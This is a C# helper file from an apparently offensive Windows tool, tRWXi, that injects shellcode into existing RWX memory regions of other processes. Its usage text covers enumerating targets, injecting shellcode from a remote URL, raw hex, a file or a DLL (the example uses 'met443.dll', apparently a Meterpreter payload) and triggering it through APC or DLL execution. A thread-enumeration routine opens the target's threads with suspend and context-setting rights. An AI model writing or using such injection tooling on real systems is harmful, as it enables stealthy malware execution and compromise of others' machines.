using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using static tRWXi.Data.Unmanaged;

namespace tRWXi.Utils
{
    internal class Helper
    {
        internal static void help()
        {
            Console.WriteLine("Usage: \n\t.\\tRWXi.exe /enumerate " +
                                     "\n\t.\\tRWXi.exe /inject /pid=<pid> /address=<hex address> (/url=<remote shellcode> | /data=<comma-separated hex code> | /file=<local shellcode | /dll=<file.dll>) [/execute] [/method=(APCTestAlert | DLL)" +
                                     "\n\t.\\tRWXi.exe /read    /pid=<pid> /address=<hex address> /size=<size> " +
                                     "\n\t.\\tRWXi.exe /trigger /pid=<pid> /address=<hex address> [/method=(APCTestAlert)]" +
                                     "\n"
                                     );
            Console.WriteLine("DLL execution:" +
                                    "\n\t.\\tRWXi.exe /inject /pid=<pid> /address=<addr> /dll=\".\\met443.dll\" /execute /method=DLL");
        }

        internal static List<IntPtr> getThreads(int pid)
        {
            THREADENTRY32 te = new THREADENTRY32();
            te.dwSize = (uint)Marshal.SizeOf(te);
            MEMORY_BASIC_INFORMATION mbi = new MEMORY_BASIC_INFORMATION();
            IntPtr hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
            bool hResult = Thread32First(hSnapshot, ref te);
            IntPtr hThread = IntPtr.Zero;
            List<IntPtr> hThreads = new List<IntPtr>();
            while (hResult)
            {
                if (te.th32OwnerProcessID == pid)
                {
                    hThread = OpenThread((SUSPEND_RESUME | GET_CONTEXT | SET_CONTEXT), false, te.th32ThreadID);
                    hThreads.Add(hThread);
                }
                hResult = Thread32Next(hSnapshot, ref te);
            }
            return hThreads;
        }
    }
}
